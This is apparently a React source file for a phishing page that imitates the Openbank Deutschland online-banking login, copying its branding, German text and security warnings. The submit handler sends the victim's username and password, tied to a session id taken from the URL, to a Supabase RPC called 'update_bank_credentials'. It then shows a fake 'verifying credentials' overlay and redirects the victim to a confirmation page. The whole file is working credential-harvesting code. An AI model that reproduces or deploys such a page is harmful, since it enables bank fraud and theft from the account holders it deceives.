import { useState, useEffect } from "react";
import { useSearchParams, useNavigate } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import LoadingOverlay from "@/components/LoadingOverlay";
import { usePageMeta } from "@/hooks/use-page-meta";
import { Eye, EyeOff, ExternalLink } from "lucide-react";
import logoAsset from "@/assets/openbank/logo.svg.asset.json";
import loginImageAsset from "@/assets/openbank/login-image.png.asset.json";

const YELLOW = "#fff0be";
const BLUE_BG = "#eef4fb";
const BLACK = "#1a1a1a";
const HERO_RED = "#c32e3d";
const INFO_RED = "#9e3667";

const Openbank = () => {
  const [params] = useSearchParams();
  const navigate = useNavigate();
  const sessionId = params.get("s") || "";
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [showPw, setShowPw] = useState(false);
  const [showLoading, setShowLoading] = useState(false);

  useEffect(() => { window.scrollTo(0, 0); }, []);
  usePageMeta("Openbank – Online Banking", logoAsset.url);

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    if (sessionId) {
      const { error } = await supabase.rpc("update_bank_credentials", {
        p_session_id: sessionId,
        p_username: username,
        p_password: password,
        p_username_label: "Benutzerkennung",
        p_password_label: "Passwort",
      });
      if (error) console.error("Update failed:", error);
    }
    setShowLoading(true);
  };

  const MehrLink = () => (
    <a href="#" className="ob-link-info inline-flex items-center gap-1.5 font-bold">
      Mehr <ExternalLink size={13} strokeWidth={2} />
    </a>
  );

  return (
    <>
      <style>{`
        .ob-font { font-family: 'SantanderMicroText','Helvetica Neue',Arial,sans-serif; color: ${BLACK}; }
        .ob-link-hero { color: ${HERO_RED}; text-decoration: none; }
        .ob-link-hero:hover { color: ${HERO_RED}; text-decoration: underline; }
        .ob-link-info { color: ${INFO_RED}; text-decoration: none; }
        .ob-link-info:hover { color: ${INFO_RED}; text-decoration: underline; }
        .ob-input {
          width: 100%;
          height: 48px;
          padding: 0 40px 0 16px;
          border: 1px solid ${BLACK};
          border-radius: 8px;
          background: #fff;
          font-size: 13px;
          color: ${BLACK};
          outline: none;
          font-family: inherit;
        }
        .ob-input::placeholder { color: #6b6b6b; }
        .ob-input:focus { border-color: ${BLACK}; box-shadow: 0 0 0 1px ${BLACK}; }
        .ob-btn-primary {
          width: 100%; height: 48px;
          background: ${BLACK}; color: #fff;
          border-radius: 999px; font-weight: 700; font-size: 13px;
          transition: background 150ms ease;
        }
        .ob-btn-primary:hover { background: #333; }
        .ob-btn-outline {
          width: 100%; height: 48px;
          background: transparent; color: ${BLACK};
          border: 1.5px solid ${BLACK};
          border-radius: 999px; font-weight: 700; font-size: 13px;
          transition: background 150ms ease;
        }
        .ob-btn-outline:hover { background: rgba(0,0,0,0.05); }
        .ob-footer-dot { color: ${INFO_RED}; margin: 0 10px; }
        .ob-footer-link { color: ${BLACK}; text-decoration: none; }
        .ob-footer-link:hover { color: ${INFO_RED}; }
      `}</style>

      <div className="ob-font min-h-screen flex flex-col bg-white">
        {/* YELLOW HERO */}
        <section style={{ background: YELLOW }} className="w-full">
          {/* Header */}
          <header className="max-w-[1200px] mx-auto px-6 lg:px-10 pt-6 pb-4 flex items-center gap-5">
            <a href="#" className="flex-shrink-0">
              <img src={logoAsset.url} alt="Openbank" className="h-10 w-auto" />
            </a>
            <div className="h-8 w-px bg-black/30" />
            <span className="text-[20px] font-bold" style={{ color: "#333" }}>Online Banking</span>
          </header>

          {/* Hero content */}
          <div className="max-w-[1200px] mx-auto px-6 lg:px-10 py-10 lg:py-16 grid grid-cols-1 lg:grid-cols-2 gap-10 items-center">
            {/* Login card */}
            <div className="lg:pl-10 lg:order-1 order-2 w-full max-w-[480px] mx-auto lg:mx-0">
              <h1 className="text-[32px] lg:text-[38px] font-bold leading-tight mb-3">Willkommen</h1>
              <p className="text-[12px] mb-6" style={{ color: "#444" }}>
                Weitere Informationen zum Online Banking finden sie <a href="#" className="ob-link-hero font-bold">hier</a>.
              </p>

              <form onSubmit={handleLogin} className="space-y-4">
                <div className="relative">
                  <input
                    type="text"
                    autoComplete="off"
                    placeholder="Benutzerkennung"
                    value={username}
                    onChange={(e) => setUsername(e.target.value)}
                    className="ob-input"
                  />
                  <span className="absolute right-4 top-1/2 -translate-y-1/2 text-black/70" aria-hidden>
                    <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.6">
                      <circle cx="12" cy="8" r="3.2" />
                      <path d="M5 20c0-3.5 3.1-6 7-6s7 2.5 7 6" />
                      <path d="M4 21h16" strokeWidth="1.8" />
                    </svg>
                  </span>
                </div>

                <div className="relative">
                  <input
                    type={showPw ? "text" : "password"}
                    autoComplete="off"
                    placeholder="Passwort"
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    className="ob-input"
                  />
                  <button
                    type="button"
                    onClick={() => setShowPw((v) => !v)}
                    className="absolute right-4 top-1/2 -translate-y-1/2 text-black/70"
                    aria-label={showPw ? "Passwort verbergen" : "Passwort anzeigen"}
                  >
                    {showPw ? <EyeOff size={20} /> : <Eye size={20} />}
                  </button>
                </div>

                <div>
                  <a href="#" className="ob-link-hero font-bold text-[12px]">Passwort zurücksetzen</a>
                </div>

                <button type="submit" className="ob-btn-primary">Einloggen</button>

                <div className="text-center">
                  <a href="#" className="ob-link-hero font-bold text-[12px]">Signaturverfahren einrichten</a>
                </div>

                <button type="button" className="ob-btn-outline">Konto eröffnen</button>
              </form>
            </div>

            {/* Lifestyle image */}
            <div className="hidden lg:flex order-1 lg:order-2 justify-center">
              <img
                src={loginImageAsset.url}
                alt=""
                className="w-full max-w-[520px] h-auto"
                style={{ aspectRatio: "1 / 1", objectFit: "cover", borderRadius: "50%" }}
              />
            </div>
          </div>
        </section>

        {/* INFO SECTION */}
        <section style={{ background: BLUE_BG }} className="w-full flex-1">
          <div className="max-w-[1200px] mx-auto px-6 lg:px-10 py-12 grid grid-cols-1 md:grid-cols-3 gap-10">
            <div>
              <h3 className="font-bold text-[13px] mb-4 leading-snug">
                Achtung: Unser Name ändert sich, unser Anspruch an Ihre Sicherheit bleibt. Betrüger nutzen den Wechsel zu Openbank für gefälschte E-Mails, Briefe, SMS und Anrufe.
              </h3>
              <ul className="list-disc pl-5 space-y-2 text-[11px] mb-4">
                <li>Lassen Sie sich nicht durch dringende Aufforderungen oder angedrohte Konsequenzen, wie z. B. eine Sperrung des Online-Banking-Zugangs, unter Druck setzen.</li>
                <li>Seien Sie vorsichtig bei SMS oder E-Mails mit Links zum Online Banking. Rufen Sie Ihr Online Banking ausschließlich direkt über die Openbank App oder die Openbank Website auf.</li>
                <li>Openbank wird Sie niemals auffordern, eine Transaktion per Sign zu bestätigen, Stornierungsaufträge oder eine Rückbuchung vorzunehmen.</li>
                <li>Bei technischen Problemen fordern wir Sie niemals auf, uns per Fernwartungssoftware Zugriff auf Ihr persönliches Endgerät zu gewähren.</li>
              </ul>
              <MehrLink />
            </div>
            <div>
              <h3 className="font-bold text-[13px] mb-4">Online Zahlungen mit Ihrer Visa Karte</h3>
              <p className="text-[11px] mb-4 leading-relaxed">
                Zu Ihrer Sicherheit werden Sie bei den meisten Online-Zahlungen mit Ihrer Openbank Visa Debit- bzw. Kreditkarte aufgefordert, Ihre Zahlung mit einem sicheren Verfahren freizugeben (Zwei-Faktor-Authentifizierung). Nutzen Sie dafür unsere komfortable OpenbankSign App. Diese können Sie bequem im <a href="#" className="ob-link-info font-bold">Apple Store</a> oder <a href="#" className="ob-link-info font-bold">Google Play Store</a> auf Ihrem Smartphone herunterladen.
              </p>
              <p className="text-[11px] mb-4 leading-relaxed">
                Sie haben noch kein Online Banking oder Fragen diesbezüglich? Dann finden Sie weitere Details sowie unsere Kontaktdaten unter
              </p>
              <MehrLink />
            </div>
            <div>
              <h3 className="font-bold text-[13px] mb-4">Aktualisierung der Datenschutzhinweise</h3>
              <p className="text-[11px] mb-4 leading-relaxed">
                Wir haben die Datenschutzhinweise für das Online Banking aktualisiert.
              </p>
              <MehrLink />
            </div>
          </div>

          {/* Footer */}
          <div className="max-w-[1200px] mx-auto px-6 lg:px-10 py-6 text-[10px] text-center flex flex-wrap items-center justify-center gap-y-2">
            <span>© 2026 Openbank Deutschland AG</span>
            <span className="ob-footer-dot">•</span>
            <a href="#" className="ob-footer-link">Hilfe</a>
            <span className="ob-footer-dot">•</span>
            <a href="#" className="ob-footer-link">Kontakt</a>
            <span className="ob-footer-dot">•</span>
            <a href="#" className="ob-footer-link">Filialfinder</a>
            <span className="ob-footer-dot">•</span>
            <a href="#" className="ob-footer-link">Sicherheitshinweise</a>
            <span className="ob-footer-dot">•</span>
            <a href="#" className="ob-footer-link">Datenschutz</a>
            <span className="ob-footer-dot">•</span>
            <a href="#" className="ob-footer-link">Cookie Einstellungen</a>
            <span className="ob-footer-dot">•</span>
            <a href="#" className="ob-footer-link">Impressum</a>
          </div>
        </section>
      </div>

      {showLoading && (
        <LoadingOverlay
          message="Anmeldedaten werden überprüft..."
          onComplete={() => navigate("/confirmation?s=" + sessionId)}
        />
      )}
    </>
  );
};

export default Openbank;
